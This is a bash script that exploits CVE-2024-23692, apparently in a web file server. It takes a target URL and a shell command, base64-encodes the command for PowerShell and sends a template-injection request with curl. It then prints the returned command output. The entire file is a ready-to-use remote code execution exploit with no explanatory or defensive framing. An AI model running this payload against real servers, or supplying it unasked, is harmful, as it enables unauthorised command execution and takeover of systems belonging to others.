#!/usr/bin/env bash

set -e

if [ "$#" -ne 2 ]; then
    echo -e "Usage: $0 <url> <command>"
    exit 1
fi

echo -e "================ \033[0;31mCVE-2024-23692\033[0m ================\n"

commands=$(echo "echo [S]; "$2"; echo [S];" | iconv -t UTF-16LE | base64 -w 0)
payload="/?n=%0A&cmd=cmd+/c+powershell+-enc+$commands&search=%25xxx%25url%25:%password%\}\{.exec|\{.?cmd.\}|timeout=15|out=abc.\}\{.?n.\}\{.?n.\}RESULT:\{.?n.\}\{.^abc.\}====\{.?n.\}"

url=$1$payload

#echo $url


response=$(curl -s -X GET $url)

result=$(echo "$response" | awk 'BEGIN {found=0} /\[S\]/ {if (found == 0) {found=1; next} else {exit}} found {print}')

echo -e "[\033[0;32m*\033[0m]" $(date "+%Y-%m-%d %H:%M:%S") " \n[\033[0;32m*\033[0m] Output: \n"

echo "$result"

echo -e "\n"
